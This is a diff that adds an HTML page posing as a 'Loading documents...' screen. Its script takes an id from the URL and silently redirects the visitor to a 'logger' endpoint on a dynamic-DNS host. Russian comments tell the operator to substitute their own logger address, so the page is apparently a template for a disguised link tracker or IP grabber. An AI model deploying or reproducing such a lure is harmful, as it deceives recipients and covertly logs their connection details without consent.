@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading documents...</title>
+    <style>
+        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // Извлечение slug из URL (например, ?id=my-link)
+        const urlParams = new URLSearchParams(window.location.search);
+        const slug = urlParams.get('id');
+        const targetServer = "http://echomapwa.ddns.net/logger/l/"; // ЗАМЕНИ НА СВОЙ АДРЕС
+
+        if (slug) {
+            // Перенаправляем на твой логгер, пробрасывая ID
+            window.location.href = targetServer + slug;
+        } else {
+            document.body.innerHTML = "Document not found.";
+        }
+    </script>
+</body>
+</html>
